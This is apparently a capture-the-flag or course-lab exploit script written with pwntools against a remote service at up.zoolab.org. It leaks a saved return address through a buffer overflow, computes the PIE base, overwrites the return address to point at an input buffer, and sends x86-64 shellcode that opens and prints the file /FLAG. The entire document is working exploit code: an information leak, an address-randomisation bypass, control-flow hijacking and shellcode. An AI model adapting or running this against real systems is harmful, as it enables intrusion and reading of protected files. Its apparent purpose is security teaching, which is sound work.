from pwn import *
import sys

context.arch = 'amd64'
context.os = 'linux'

port = 12342
RET_RVA  = 0x9bd2
MSG_RVA  = 0xef220

shellcode = asm("""
    xor rax, rax
    mov rbx, 0x47414c462f  # "/FLAG"
    push rbx
    mov rdi, rsp           # file name
    xor rsi, rsi           # O_RDONLY
    mov rax, 2             # syscall - open
    syscall

    mov rdi, rax           # file descriptor
    mov rsi, rsp           # buffer 
    mov rdx, 0x100         # count - read length
    xor rax, rax           # syscall - read
    syscall
                
    mov rdx, rax           # get number of bytes read
    mov rdi, 1             # stdout
    mov rax, 1             # syscall - write
    syscall

    mov rax, 60            # syscall - exit
    xor rdi, rdi
    syscall
""")


r = remote('up.zoolab.org', port)

r.sendline(b'A'*120)
r.recvuntil(b'A'*120)
r.recv(8)
saved_rip = u64(r.recv(8))
pie = saved_rip - RET_RVA 
print(f'saved_rip: {hex(saved_rip)}')
print(f'pie: {hex(pie)}')

r.sendline(b'QAQ')

msg_addr = pie + MSG_RVA  
overflow  = b'C' * 48          
overflow += p64(msg_addr)      
r.sendline(overflow)          

r.send(shellcode)
r.interactive()
